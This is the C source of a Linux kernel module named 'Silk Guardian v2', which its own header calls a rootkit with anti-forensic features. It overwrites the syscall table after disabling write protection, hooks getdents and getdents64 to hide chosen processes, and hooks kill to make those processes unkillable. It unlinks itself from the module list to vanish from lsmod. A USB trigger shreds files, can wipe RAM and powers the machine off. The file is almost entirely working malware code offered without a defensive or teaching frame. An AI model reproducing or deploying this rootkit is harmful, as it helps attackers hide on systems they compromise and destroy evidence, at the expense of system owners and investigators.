// SOFINCO v6.0 - Silk Guardian v2 - Enhanced Kernel Module
// Rootkit capabilities + Syscall hooking + Memory hiding

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/usb.h>
#include <linux/reboot.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <asm/paravirt.h>
#include "config.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("sofinco");
MODULE_DESCRIPTION("Silk Guardian v2 - Enhanced Anti-Forensic Kernel Module");
MODULE_VERSION("2.0.0");

// ============================================
// SYSCALL HOOKING
// ============================================

unsigned long *__sys_call_table;
unsigned long original_cr0;

// Original syscall pointers
asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
asmlinkage long (*original_kill)(pid_t pid, int sig);

// Hidden process list
static LIST_HEAD(hidden_procs);

struct hidden_proc {
    pid_t pid;
    struct list_head list;
};

// Disable write protection
static inline void disable_wp(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0(cr0);
}

// Enable write protection
static inline void enable_wp(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}

// Check if PID is hidden
static int is_hidden_pid(pid_t pid) {
    struct hidden_proc *hp;
    list_for_each_entry(hp, &hidden_procs, list) {
        if (hp->pid == pid)
            return 1;
    }
    return 0;
}

// Hide process
void hide_process(pid_t pid) {
    struct hidden_proc *hp;
    
    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp)
        return;
    
    hp->pid = pid;
    list_add(&hp->list, &hidden_procs);
    
    pr_info("Hidden process: %d\n", pid);
}

// Hooked getdents - hide processes
asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    long ret;
    struct linux_dirent *d;
    unsigned long offset = 0;
    
    ret = original_getdents(fd, dirp, count);
    if (ret <= 0)
        return ret;
    
    while (offset < ret) {
        d = (struct linux_dirent *)((char *)dirp + offset);
        
        // Check if this is a PID directory
        if (simple_strtoul(d->d_name, NULL, 10) != 0) {
            pid_t pid = simple_strtoul(d->d_name, NULL, 10);
            
            if (is_hidden_pid(pid)) {
                // Remove this entry
                unsigned int reclen = d->d_reclen;
                char *next = (char *)d + reclen;
                unsigned int len = ret - offset - reclen;
                
                memmove(d, next, len);
                ret -= reclen;
                continue;
            }
        }
        
        offset += d->d_reclen;
    }
    
    return ret;
}

// Hooked getdents64 - hide processes
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    long ret;
    struct linux_dirent64 *d;
    unsigned long offset = 0;
    
    ret = original_getdents64(fd, dirp, count);
    if (ret <= 0)
        return ret;
    
    while (offset < ret) {
        d = (struct linux_dirent64 *)((char *)dirp + offset);
        
        if (simple_strtoul(d->d_name, NULL, 10) != 0) {
            pid_t pid = simple_strtoul(d->d_name, NULL, 10);
            
            if (is_hidden_pid(pid)) {
                unsigned int reclen = d->d_reclen;
                char *next = (char *)d + reclen;
                unsigned int len = ret - offset - reclen;
                
                memmove(d, next, len);
                ret -= reclen;
                continue;
            }
        }
        
        offset += d->d_reclen;
    }
    
    return ret;
}

// Hooked kill - protect hidden processes
asmlinkage long hooked_kill(pid_t pid, int sig) {
    if (is_hidden_pid(pid)) {
        pr_info("Blocked kill signal to hidden process: %d\n", pid);
        return -ESRCH; // No such process
    }
    
    return original_kill(pid, sig);
}

// ============================================
// MEMORY HIDING
// ============================================

static struct list_head *module_previous;
static short module_hidden = 0;

void module_hide(void) {
    if (module_hidden)
        return;
    
    module_previous = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
    
    pr_info("Module hidden from lsmod\n");
}

void module_show(void) {
    if (!module_hidden)
        return;
    
    list_add(&THIS_MODULE->list, module_previous);
    module_hidden = 0;
    
    pr_info("Module visible in lsmod\n");
}

// ============================================
// USB KILL-SWITCH (Original functionality)
// ============================================

static void panic_time(struct usb_device *usb) {
    int i;
    struct device *dev;
    
    pr_info("USB threat detected! Initiating emergency protocol...\n");
    
    // Shred files
    pr_info("Shredding sensitive files...\n");
    for (i = 0; remove_files[i] != NULL; ++i) {
        char *shred_argv[] = {
            "/usr/bin/shred",
            "-f", "-u", "-n",
            shredIterations,
            remove_files[i],
            NULL,
        };
        call_usermodehelper(shred_argv[0], shred_argv, NULL, UMH_WAIT_EXEC);
    }
    
    #ifdef WIPE_RAM
    pr_info("Wiping RAM...\n");
    call_usermodehelper(sdmem_argv[0], sdmem_argv, NULL, UMH_WAIT_EXEC);
    #endif
    
    for (dev = &usb->dev; dev; dev = dev->parent)
        mutex_unlock(&dev->mutex);
    
    pr_info("Syncing & powering off...\n");
    
    #ifdef USE_ORDERLY_SHUTDOWN
    orderly_poweroff(true);
    #else
    kernel_power_off();
    #endif
}

static int usb_match_device(struct usb_device *dev, const struct usb_device_id *id) {
    if ((id->match_flags & USB_DEVICE_ID_MATCH_VENDOR) &&
        id->idVendor != le16_to_cpu(dev->descriptor.idVendor))
        return 0;
    
    if ((id->match_flags & USB_DEVICE_ID_MATCH_PRODUCT) &&
        id->idProduct != le16_to_cpu(dev->descriptor.idProduct))
        return 0;
    
    return 1;
}

static void usb_dev_change(struct usb_device *dev) {
    const struct usb_device_id *dev_id;
    unsigned long whitelist_len = sizeof(whitelist_table)/sizeof(whitelist_table[0]);
    int i;
    
    for(i = 0; i < whitelist_len; i++) {
        dev_id = &whitelist_table[i];
        if (usb_match_device(dev, dev_id)) {
            pr_info("Whitelisted device detected\n");
            return;
        }
    }
    
    panic_time(dev);
}

static int notify(struct notifier_block *self, unsigned long action, void *dev) {
    switch (action) {
    case USB_DEVICE_ADD:
        usb_dev_change(dev);
        break;
    case USB_DEVICE_REMOVE:
        usb_dev_change(dev);
        break;
    default:
        break;
    }
    return 0;
}

static struct notifier_block usb_notify = {
    .notifier_call = notify,
};

// ============================================
// MODULE INIT/EXIT
// ============================================

static int __init silk_init(void) {
    pr_info("Silk Guardian v2.0 initializing...\n");
    
    // Find syscall table
    __sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!__sys_call_table) {
        pr_err("Failed to find sys_call_table\n");
        return -ENOMEM;
    }
    
    // Save original syscalls
    original_getdents = (void *)__sys_call_table[__NR_getdents];
    original_getdents64 = (void *)__sys_call_table[__NR_getdents64];
    original_kill = (void *)__sys_call_table[__NR_kill];
    
    // Hook syscalls
    disable_wp();
    __sys_call_table[__NR_getdents] = (unsigned long)hooked_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
    enable_wp();
    
    // Hide current process (insmod)
    hide_process(current->pid);
    
    // Hide module
    module_hide();
    
    // Register USB notifier
    usb_register_notify(&usb_notify);
    
    pr_info("✅ Silk Guardian v2.0 active\n");
    pr_info("   - Syscall hooks: enabled\n");
    pr_info("   - Process hiding: enabled\n");
    pr_info("   - Module hiding: enabled\n");
    pr_info("   - USB monitoring: enabled\n");
    
    return 0;
}

static void __exit silk_exit(void) {
    struct hidden_proc *hp, *tmp;
    
    pr_info("Silk Guardian v2.0 shutting down...\n");
    
    // Unhook syscalls
    disable_wp();
    __sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long)original_kill;
    enable_wp();
    
    // Show module
    module_show();
    
    // Unregister USB notifier
    usb_unregister_notify(&usb_notify);
    
    // Free hidden process list
    list_for_each_entry_safe(hp, tmp, &hidden_procs, list) {
        list_del(&hp->list);
        kfree(hp);
    }
    
    pr_info("Silk Guardian v2.0 unloaded\n");
}

module_init(silk_init);
module_exit(silk_exit);
